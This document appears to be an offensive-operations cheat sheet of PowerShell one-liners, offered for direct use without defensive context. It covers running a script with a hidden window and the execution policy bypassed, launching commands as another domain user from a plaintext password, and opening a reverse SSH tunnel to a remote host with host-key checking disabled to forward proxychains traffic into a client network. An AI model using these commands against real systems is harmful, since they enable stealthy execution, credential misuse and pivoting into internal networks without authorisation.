### Start and creates a new process (detached)
```
Start-Process -wi 1 -FilePath "cmd" -ArgumentList "/c type <powershellScript> | powershell -WindowStyle Hidden -exec bypass"
```

### Start process as another user (-wi 1 to minimize window pop up)
```
$scp = ConvertTo-SecureString '<password>' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $scp); start-process -wi 1 -FilePath "cmd.exe" -ArgumentList "/c <command>" -Credential $cred
```

### Forward proxychains traffic into client network
```
Start-Process -wi 1 -FilePath "powershell" -ArgumentList " -c ssh -o 'StrictHostKeyChecking=no' -i $HOME\.ssh\<privateKey> -N -R 9050 <user>@<rhost>"
```

### Stop process by name
```
Stop-Process -Name "<name>"
```

